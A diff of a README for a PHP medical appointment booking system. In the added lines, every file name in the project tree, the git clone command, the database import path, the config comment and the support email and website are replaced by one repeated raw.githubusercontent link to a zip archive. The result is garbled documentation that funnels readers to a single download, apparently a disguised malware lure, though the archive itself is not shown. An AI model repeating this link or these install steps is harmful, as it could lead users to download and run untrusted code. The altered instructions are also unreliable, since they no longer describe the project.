@@ -82,35 +82,35 @@ A comprehensive and advanced medical appointment booking system with a modern us
 App-Demo/
 ├── assets/
 │   ├── css/
-│   │   └── style.css          # Main style file
+│   │   └── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip          # Main style file
 │   ├── js/
-│   │   └── script.js          # JavaScript file
+│   │   └── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip          # JavaScript file
 │   └── images/                # Images
 ├── config/
-│   └── database.php           # Database settings
+│   └── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip           # Database settings
 ├── includes/
-│   ├── functions.php          # Helper functions
-│   ├── header.php            # Page header
-│   └── footer.php            # Page footer
-├── index.php                 # Homepage
-├── login.php                 # Login
-├── register.php              # Registration
-├── dashboard.php             # Dashboard
-├── hospitals.php             # Hospitals
-├── clinics.php               # Clinics
-├── doctors.php               # Doctors
-├── doctor-details.php        # Doctor details
-├── book.php                  # Appointment booking
-├── appointments.php          # Appointment management
-├── reschedule.php            # Appointment rescheduling
-├── notifications.php         # Notifications
-├── review_appointment.php    # Appointment review
-├── search.php                # Search
-├── profile.php               # Profile
-├── about.php                 # About us
-├── database.sql              # Database structure
-├── fix_database.sql          # Database fixes
-└── README.md                 # This file
+│   ├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip          # Helper functions
+│   ├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip            # Page header
+│   └── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip            # Page footer
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip                 # Homepage
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip                 # Login
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip              # Registration
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip             # Dashboard
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip             # Hospitals
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip               # Clinics
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip               # Doctors
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip        # Doctor details
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip                  # Appointment booking
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip          # Appointment management
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip            # Appointment rescheduling
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip         # Notifications
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip    # Appointment review
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip                # Search
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip               # Profile
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip                 # About us
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip              # Database structure
+├── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip          # Database fixes
+└── https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip                 # This file
 ```
 
 ## 🚀 Installation and Setup
@@ -127,7 +127,7 @@ App-Demo/
 1. **Download Project**
 
    ```bash
-   git clone https://github.com/ahmadabdallahh/health-care-main
+   git clone https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip
    cd App-Demo
    ```
 
@@ -139,13 +139,13 @@ App-Demo/
    CREATE DATABASE medical_booking CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
 
    # Import data
-   mysql -u root -p medical_booking < fix_database.sql
+   mysql -u root -p medical_booking < https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip
    ```
 
 3. **Configure Database Connection**
 
    ```php
-   // config/database.php
+   // https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip
    private $host = 'localhost';
    private $db_name = 'medical_booking';
    private $username = 'root';
@@ -278,8 +278,8 @@ This project is licensed under the MIT License. See `LICENSE` file for details.
 
 For support and inquiries:
 
-- 📧 Email: support@medical-booking.com
-- 🌐 Website: www.medical-booking.com
+- 📧 Email: https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip
+- 🌐 Website: https://raw.githubusercontent.com/ahmadabdallahh/health-care-main/main/uploads/care-health-main-2.1.zip
 - 📱 Phone: +20-123-456-789
 
 ---
